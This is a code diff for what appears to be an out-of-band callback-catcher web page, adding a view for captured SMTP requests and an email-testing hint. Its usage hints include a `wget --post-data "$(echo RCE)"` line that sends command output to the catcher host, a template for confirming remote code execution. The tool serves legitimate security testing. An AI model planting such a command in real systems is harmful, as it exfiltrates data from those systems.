@@ -8,7 +8,7 @@ import { useRequestStore } from "@/stores/requestStore";
 import { useUiStore } from "@/stores/uiStore";
 import { apiClient } from "@/api/client";
 import { useTheme } from "@/hooks/useTheme";
-import { isHttpRequest, isDnsRequest } from "@/types";
+import { isHttpRequest, isDnsRequest, isSmtpRequest } from "@/types";
 import { formatDate, copyToClipboard, getFlagClass } from "@/lib/utils";
 import { decodeBase64Safe } from "@/lib/base64";
 import { getBaseDomain, getDnsDomain } from "@/lib/config";
@@ -123,6 +123,10 @@ export function RequestsPage() {
             </Code>
             <Code className="block p-2">
               wget --post-data "$(echo RCE)" -O- {fullHttpDomain}
+            </Code>
+            <Code className="block p-2">
+              swaks --to user@{fullDnsDomain} --from test@example.com --server{" "}
+              {dnsDomain} --port 25
             </Code>
           </div>
 
@@ -473,6 +477,105 @@ export function RequestsPage() {
 
           {/* Raw request */}
           <h3 className="text-base font-semibold mb-2">Raw request</h3>
+          <Code className="block p-3 text-xs mb-2 overflow-x-auto break-all">
+            {selectedRequest.raw}
+          </Code>
+          <Code className="block whitespace-pre-wrap p-2 text-xs font-mono overflow-x-auto">
+            {rawDecoded.text}
+          </Code>
+        </CardBody>
+      </Card>
+    );
+  }
+
+  if (isSmtpRequest(selectedRequest)) {
+    const rawDecoded = decodeBase64Safe(selectedRequest.raw);
+
+    return (
+      <Card className="h-full overflow-auto">
+        <CardBody className="p-4 relative">
+          {/* Share button - only show if user has the session */}
+          {!isSharedRequestView && (
+            <Button
+              isIconOnly
+              size="sm"
+              variant="light"
+              onPress={handleShareRequest}
+              className="absolute right-4 top-4"
+              title="Share request"
+            >
+              <Share2 className="h-4 w-4" />
+            </Button>
+          )}
+
+          {/* Shared request banner */}
+          {isSharedRequestView && (
+            <div className="mb-4 p-2 bg-primary/10 rounded-lg text-sm text-primary">
+              You are viewing a shared request
+            </div>
+          )}
+
+          {/* Request Details */}
+          <h3 className="text-base font-semibold mb-2">Request Details</h3>
+          <table className="w-full text-xs mb-4">
+            <tbody>
+              <tr className="border-b border-default-100">
+                <td className="py-1 pr-4 text-default-500 w-32">
+                  Request Type
+                </td>
+                <td className="py-1">
+                  <span className="inline-block px-1 py-px text-[8px] font-semibold text-white bg-[#e91e63] rounded">
+                    SMTP
+                  </span>
+                </td>
+              </tr>
+              <tr className="border-b border-default-100">
+                <td className="py-1 pr-4 text-default-500">Command</td>
+                <td className="py-1 font-mono">{selectedRequest.command}</td>
+              </tr>
+              <tr className="border-b border-default-100">
+                <td className="py-1 pr-4 text-default-500">Sender</td>
+                <td className="py-1 font-mono">{selectedRequest.ip}</td>
+              </tr>
+              {selectedRequest.country && (
+                <tr className="border-b border-default-100">
+                  <td className="py-1 pr-4 text-default-500">Country</td>
+                  <td className="py-1">
+                    <span
+                      className={`${getFlagClass(selectedRequest.country)} mr-1`}
+                    />
+                    {selectedRequest.country} (
+                    <a
+                      href="https://db-ip.com"
+                      className="text-primary hover:underline"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                    >
+                      IP Geolocation by DB-IP
+                    </a>
+                    )
+                  </td>
+                </tr>
+              )}
+              <tr>
+                <td className="py-1 pr-4 text-default-500">Date</td>
+                <td className="py-1">{formatDate(selectedRequest.date)}</td>
+              </tr>
+            </tbody>
+          </table>
+
+          {/* Email Data */}
+          {selectedRequest.data && (
+            <>
+              <h3 className="text-base font-semibold mb-2">Email Data</h3>
+              <Code className="block whitespace-pre-wrap p-2 text-xs font-mono mb-4 overflow-x-auto">
+                {selectedRequest.data}
+              </Code>
+            </>
+          )}
+
+          {/* Raw SMTP Transaction */}
+          <h3 className="text-base font-semibold mb-2">Raw SMTP Transaction</h3>
           <Code className="block p-3 text-xs mb-2 overflow-x-auto break-all">
             {selectedRequest.raw}
           </Code>
